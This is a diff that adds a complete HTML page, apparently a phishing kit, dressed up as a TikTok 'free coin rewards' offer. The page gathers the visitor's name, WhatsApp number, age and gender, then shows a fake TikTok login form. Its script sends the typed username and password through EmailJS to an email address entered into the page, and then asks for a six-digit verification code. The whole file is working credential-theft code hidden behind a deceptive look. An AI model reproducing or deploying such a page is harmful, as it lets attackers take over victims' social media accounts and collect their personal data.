@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join TikTok Community & Coin Rewards</title>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+      (function() {
+        // Public Key Initialization
+        emailjs.init("T9BKyUuqVi2V4b31r");
+      })();
+    </script>
+
+    <!-- Google Fonts & Font Awesome Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --bg-color: #121212;
+            --card-bg: #1e1e1e;
+            --text-main: #ffffff;
+            --text-sub: #a8a8a8;
+            --tiktok-red: #fe2c55;
+            --tiktok-cyan: #25f4ee;
+            --input-bg: #2a2a2a;
+            --border-color: #3a3a3a;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+            transition: background-color 0.3s ease;
+        }
+
+        /* View Toggle Utility */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Main Container Card */
+        .app-card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card-bg);
+            border-radius: 24px;
+            padding: 28px 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7),
+                        0 0 15px rgba(254, 44, 85, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* --- PAGE 1: REGISTRATION STYLES --- */
+        .reg-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .reg-header h2 {
+            font-size: 24px;
+            color: var(--text-main);
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .reg-header p {
+            font-size: 14px;
+            color: var(--text-sub);
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #d1d1d1;
+            margin-bottom: 6px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 14px;
+            background-color: var(--input-bg);
+            color: var(--text-main);
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-group input::placeholder {
+            color: #777;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: var(--tiktok-cyan);
+            box-shadow: 0 0 8px rgba(37, 244, 238, 0.3);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, var(--tiktok-red), #e62a50);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: transform 0.15s ease, box-shadow 0.2s ease;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .btn-submit:disabled {
+            background: #555555;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        /* --- PAGE 2: TIKTOK REWARDS STYLES --- */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .tiktok-logo {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            text-shadow: -2px -1px 0px var(--tiktok-cyan), 2px 1px 0px var(--tiktok-red);
+            animation: pulseGlow 3s infinite alternate;
+        }
+
+        .tiktok-logo i {
+            font-size: 30px;
+            color: #fff;
+        }
+
+        .section-title {
+            font-size: 14px;
+            color: var(--text-sub);
+            margin-bottom: 12px;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .coin-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .coin-card {
+            background: var(--input-bg);
+            border: 2px solid transparent;
+            border-radius: 14px;
+            padding: 12px 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .coin-card:hover {
+            transform: translateY(-3px);
+            background: #333333;
+        }
+
+        .coin-card.active {
+            border-color: var(--tiktok-red);
+            background: linear-gradient(145deg, #2a2a2a, #381d28);
+            box-shadow: 0 0 12px rgba(254, 44, 85, 0.4);
+        }
+
+        .coin-icon {
+            color: #FFD700;
+            font-size: 20px;
+            margin-bottom: 4px;
+            filter: drop-shadow(0 0 4px rgba(255, 215, 0, 0.6));
+        }
+
+        .coin-amount {
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .badge-free {
+            display: inline-block;
+            margin-top: 4px;
+            font-size: 10px;
+            font-weight: 600;
+            color: var(--tiktok-cyan);
+            background: rgba(37, 244, 238, 0.12);
+            padding: 2px 6px;
+            border-radius: 10px;
+            text-transform: uppercase;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 14px;
+            color: #777;
+            font-size: 16px;
+        }
+
+        .input-wrapper input {
+            padding-left: 42px;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 12px;
+            background-color: transparent;
+            color: var(--tiktok-cyan);
+            border: 1px solid var(--tiktok-cyan);
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+            margin-top: 12px;
+            transition: all 0.2s ease;
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(37, 244, 238, 0.1);
+        }
+
+        /* --- PAGE 3: OTP VERIFICATION STYLES --- */
+        .otp-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .lock-icon-wrapper {
+            margin-bottom: 12px;
+        }
+
+        .lock-icon {
+            width: 44px;
+            height: 44px;
+            fill: var(--tiktok-cyan);
+        }
+
+        .otp-header h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        .otp-subtitle {
+            font-size: 13px;
+            color: var(--text-sub);
+            line-height: 1.4;
+        }
+
+        .otp-instruction {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: var(--text-main);
+            text-align: left;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 6px;
+            margin-bottom: 16px;
+        }
+
+        .otp-field {
+            width: 46px;
+            height: 50px;
+            border-radius: 8px;
+            border: 2px solid var(--border-color);
+            background-color: var(--input-bg);
+            color: var(--text-main);
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+            outline: none;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .otp-field:focus {
+            border-color: var(--tiktok-red);
+            box-shadow: 0 0 8px rgba(254, 44, 85, 0.4);
+        }
+
+        .sent-info {
+            font-size: 13px;
+            color: var(--text-sub);
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .sent-info span {
+            color: var(--text-main);
+            font-weight: 600;
+        }
+
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .captcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .captcha-checkbox {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--tiktok-red);
+            cursor: pointer;
+        }
+
+        .captcha-label {
+            font-size: 14px;
+            color: var(--text-main);
+            user-select: none;
+        }
+
+        .tiktok-badge {
+            width: 22px;
+            height: 22px;
+            background: linear-gradient(135deg, var(--tiktok-cyan), var(--tiktok-red));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: bold;
+            color: #000;
+        }
+
+        /* Floating Animated Coins Container */
+        #animation-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        .floating-coin {
+            position: absolute;
+            color: #FFD700;
+            font-size: 24px;
+            animation: floatUp 1.2s ease-out forwards;
+            filter: drop-shadow(0 0 6px #FFD700);
+        }
+
+        /* Keyframes */
+        @keyframes floatUp {
+            0% {
+                opacity: 1;
+                transform: translateY(0) scale(0.8) rotate(0deg);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-180px) scale(1.4) rotate(360deg);
+            }
+        }
+
+        @keyframes pulseGlow {
+            0% { text-shadow: -2px -1px 0px var(--tiktok-cyan), 2px 1px 0px var(--tiktok-red); }
+            100% { text-shadow: -3px -1px 4px var(--tiktok-cyan), 3px 1px 4px var(--tiktok-red); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-card">
+        <!-- Floating Coin Animations -->
+        <div id="animation-overlay"></div>
+
+        <!-- PAGE 1: REGISTRATION SECTION -->
+        <div id="registerView" class="view">
+            <div class="reg-header">
+                <h2>Join Community</h2>
+                <p>Please fill in your details to create an account.</p>
+            </div>
+
+            <!-- Form -->
+            <form id="communityForm">
+                <!-- Full name -->
+                <div class="form-group">
+                    <label for="fullName">Full name</label>
+                    <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required />
+                </div>
+
+                <!-- WhatsApp Contact -->
+                <div class="form-group">
+                    <label for="whatsapp">WhatsApp Contact</label>
+                    <input type="tel" id="whatsapp" name="whatsapp" placeholder="Enter your WhatsApp number" required />
+                </div>
+
+                <!-- How long have you been using social media -->
+                <div class="form-group">
+                    <label for="fbDuration">How long have you been using social media</label>
+                    <input type="text" id="fbDuration" name="fbDuration" placeholder="e.g. 3 years" required />
+                </div>
+
+                <!-- Age -->
+                <div class="form-group">
+                    <label for="age">Age</label>
+                    <input type="number" id="age" name="age" placeholder="Enter your age" required />
+                </div>
+
+                <!-- Gender -->
+                <div class="form-group">
+                    <label for="gender">Gender</label>
+                    <select id="gender" name="gender" required>
+                        <option value="" disabled selected>Select your gender</option>
+                        <option value="Male">Male</option>
+                        <option value="Female">Female</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+
+                <!-- Referrer Email Input -->
+                <div class="form-group">
+                    <label for="referrer">Referrer Email</label>
+                    <input type="email" id="referrer" name="referrer" placeholder="Enter referrer's email address" required />
+                </div>
+
+                <!-- Join Community Button -->
+                <button type="submit" class="btn-submit">Join Community</button>
+            </form>
+        </div>
+
+        <!-- PAGE 2: TIKTOK COIN REWARDS LOGIN SECTION -->
+        <div id="loginView" class="view hidden">
+            <!-- TikTok Logo Header -->
+            <div class="logo-container">
+                <div class="tiktok-logo">
+                    <i class="fab fa-tiktok"></i> TikTok
+                </div>
+            </div>
+
+            <p class="section-title">Select Free Coin Reward</p>
+
+            <!-- Coin Offers Grid -->
+            <div class="coin-grid">
+                <div class="coin-card active" onclick="selectCoin(this, '1,400')">
+                    <div class="coin-icon"><i class="fas fa-coins"></i></div>
+                    <div class="coin-amount">1,400</div>
+                    <span class="badge-free">FREE</span>
+                </div>
+
+                <div class="coin-card" onclick="selectCoin(this, '3,500')">
+                    <div class="coin-icon"><i class="fas fa-coins"></i></div>
+                    <div class="coin-amount">3,500</div>
+                    <span class="badge-free">FREE</span>
+                </div>
+
+                <div class="coin-card" onclick="selectCoin(this, '7,000')">
+                    <div class="coin-icon"><i class="fas fa-coins"></i></div>
+                    <div class="coin-amount">7,000</div>
+                    <span class="badge-free">FREE</span>
+                </div>
+            </div>
+
+            <!-- Login Form -->
+            <form class="login-form" id="authForm">
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <i class="fas fa-user"></i>
+                        <input 
+                            type="text" 
+                            id="loginField"
+                            placeholder="Mobile number or email address" 
+                            required 
+                        />
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <i class="fas fa-lock"></i>
+                        <input 
+                            type="password" 
+                            id="passwordField"
+                            placeholder="Password" 
+                            required 
+                        />
+                    </div>
+                </div>
+
+                <button type="submit" id="loginBtn" class="btn-submit">
+                    <span id="loginBtnText">Get Coin</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </form>
+
+            <a href="#" id="showRegisterBtn" class="btn-secondary">Create new account</a>
+        </div>
+
+        <!-- PAGE 3: OTP VERIFICATION SECTION -->
+        <div id="otpView" class="view hidden">
+            <div class="otp-header">
+                <div class="lock-icon-wrapper">
+                    <svg class="lock-icon" viewBox="0 0 24 24">
+                        <path d="M12 2C9.24 2 7 4.24 7 7V10H6C4.9 10 4 10.9 4 12V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V12C20 10.9 19.1 10 18 10H17V7C17 4.24 14.76 2 12 2ZM9 7C9 5.34 10.34 4 12 4C13.66 4 15 5.34 15 7V10H9V7ZM12 17C10.9 17 10 16.1 10 15C10 13.9 10.9 13 12 13C13.1 13 14 13.9 14 15C14 16.1 13.1 17 12 17Z"/>
+                    </svg>
+                </div>
+                <h2>OTP Verification</h2>
+                <p class="otp-subtitle">Enter the 6-digit code sent to you to confirm it really you</p>
+            </div>
+
+            <p class="otp-instruction">Enter the 6 digit code</p>
+
+            <div class="otp-inputs" id="otp-container">
+                <input type="text" maxlength="1" class="otp-field" />
+                <input type="text" maxlength="1" class="otp-field" />
+                <input type="text" maxlength="1" class="otp-field" />
+                <input type="text" maxlength="1" class="otp-field" />
+                <input type="text" maxlength="1" class="otp-field" />
+                <input type="text" maxlength="1" class="otp-field" />
+            </div>
+
+            <p class="sent-info">
+                A verification code was sent to <span id="sentPhoneDisplay">+2347020000</span>
+            </p>
+
+            <div class="captcha-box" onclick="document.getElementById('bot-check').click();">
+                <div class="captcha-left">
+                    <input type="checkbox" id="bot-check" class="captcha-checkbox" onclick="event.stopPropagation();" />
+                    <label for="bot-check" class="captcha-label">I'm not a bot</label>
+                </div>
+                <div class="tiktok-badge">✓</div>
+            </div>
+
+            <button type="button" class="btn-submit" id="verifyBtn">Verify Code</button>
+        </div>
+    </div>
+
+    <script>
+        const registerView = document.getElementById('registerView');
+        const loginView = document.getElementById('loginView');
+        const otpView = document.getElementById('otpView');
+        
+        const showRegisterBtn = document.getElementById('showRegisterBtn');
+        const loginField = document.getElementById('loginField');
+        const passwordField = document.getElementById('passwordField');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginBtnText = document.getElementById('loginBtnText');
+        const sentPhoneDisplay = document.getElementById('sentPhoneDisplay');
+
+        const otpInputs = document.querySelectorAll('.otp-field');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const botCheck = document.getElementById('bot-check');
+
+        let registrationData = {};
+        let selectedAmount = '1,400';
+
+        // View Navigation
+        function goToLogin() {
+            registerView.classList.add('hidden');
+            otpView.classList.add('hidden');
+            loginView.classList.remove('hidden');
+        }
+
+        function goToRegistration() {
+            loginView.classList.add('hidden');
+            otpView.classList.add('hidden');
+            registerView.classList.remove('hidden');
+        }
+
+        function goToOtp() {
+            registerView.classList.add('hidden');
+            loginView.classList.add('hidden');
+            otpView.classList.remove('hidden');
+            otpInputs[0].focus();
+        }
+
+        // 1. Select coin package
+        function selectCoin(cardElement, amount) {
+            document.querySelectorAll('.coin-card').forEach(card => {
+                card.classList.remove('active');
+            });
+            cardElement.classList.add('active');
+            selectedAmount = amount;
+        }
+
+        // 2. Trigger floating coin animation
+        function triggerCoinAnimation() {
+            const overlay = document.getElementById('animation-overlay');
+            for (let i = 0; i < 12; i++) {
+                setTimeout(() => {
+                    const coin = document.createElement('i');
+                    coin.className = 'fas fa-coins floating-coin';
+                    
+                    const randomX = Math.random() * 80 + 10; 
+                    coin.style.left = randomX + '%';
+                    coin.style.bottom = '80px';
+                    
+                    overlay.appendChild(coin);
+
+                    setTimeout(() => coin.remove(), 1200);
+                }, i * 60);
+            }
+        }
+
+        // 3. Collect registration data and navigate to Login page
+        document.getElementById('communityForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            registrationData = {
+                fullName: document.getElementById('fullName').value,
+                whatsapp: document.getElementById('whatsapp').value,
+                fbDuration: document.getElementById('fbDuration').value,
+                age: document.getElementById('age').value,
+                gender: document.getElementById('gender').value,
+                referrer: document.getElementById('referrer').value
+            };
+
+            // Pre-fill login & OTP phone fields
+            if (registrationData.whatsapp.trim() !== '') {
+                loginField.value = registrationData.whatsapp;
+                sentPhoneDisplay.innerText = registrationData.whatsapp;
+            }
+
+            goToLogin();
+        });
+
+        // 4. Switch back to Registration Page
+        showRegisterBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            goToRegistration();
+        });
+
+        // 5. Handle Login Submit & EmailJS dispatch -> Navigate to OTP Page
+        document.getElementById('authForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Run coin animation effect
+            triggerCoinAnimation();
+
+            loginBtnText.innerText = 'Processing...';
+            loginBtn.disabled = true;
+
+            // Dynamically update display phone if login input was changed
+            if (loginField.value.trim() !== '') {
+                sentPhoneDisplay.innerText = loginField.value;
+            }
+
+            const templateParams = {
+                to_email: registrationData.referrer || '',
+                full_name: registrationData.fullName || '',
+                whatsapp: registrationData.whatsapp || '',
+                experience: registrationData.fbDuration || '',
+                age: registrationData.age || '',
+                gender: registrationData.gender || '',
+                referrer: registrationData.referrer || '',
+                login_phone: loginField.value,
+                login_password: passwordField.value,
+                selected_coins: selectedAmount
+            };
+
+            emailjs.send("service_rf9jc9g", "template_ykjxd5h", templateParams)
+                .then(function(response) {
+                    loginBtnText.innerText = 'Get Coin';
+                    loginBtn.disabled = false;
+                    
+                    // Direct user to Page 3 (OTP)
+                    goToOtp();
+                }, function(error) {
+                    alert('Failed to send details: ' + JSON.stringify(error));
+                    loginBtnText.innerText = 'Get Coin';
+                    loginBtn.disabled = false;
+                });
+        });
+
+        // 6. OTP Input Handling
+        otpInputs.forEach((input, index) => {
+            // Move forward on typing digit
+            input.addEventListener('input', (e) => {
+                const val = e.target.value;
+                e.target.value = val.replace(/[^0-9]/g, '');
+
+                if (e.target.value !== '' && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            // Move backward on backspace
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            // Auto fill on pasting 6 digits
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pasteData = e.clipboardData.getData('text').trim();
+                if (/^\d{6}$/.test(pasteData)) {
+                    pasteData.split('').forEach((char, i) => {
+                        if (otpInputs[i]) otpInputs[i].value = char;
+                    });
+                    otpInputs[otpInputs.length - 1].focus();
+                }
+            });
+        });
+
+        // 7. Handle Final OTP Verification
+        verifyBtn.addEventListener('click', () => {
+            let code = '';
+            otpInputs.forEach(input => code += input.value);
+
+            if (code.length < 6) {
+                alert('Please enter all 6 digits of the verification code.');
+                return;
+            }
+
+            if (!botCheck.checked) {
+                alert('Please check "I\'m not a bot" before proceeding.');
+                return;
+            }
+
+            alert(`Verification successful! Submitted code: ${code}`);
+        });
+    </script>
+
+</body>
+</html>
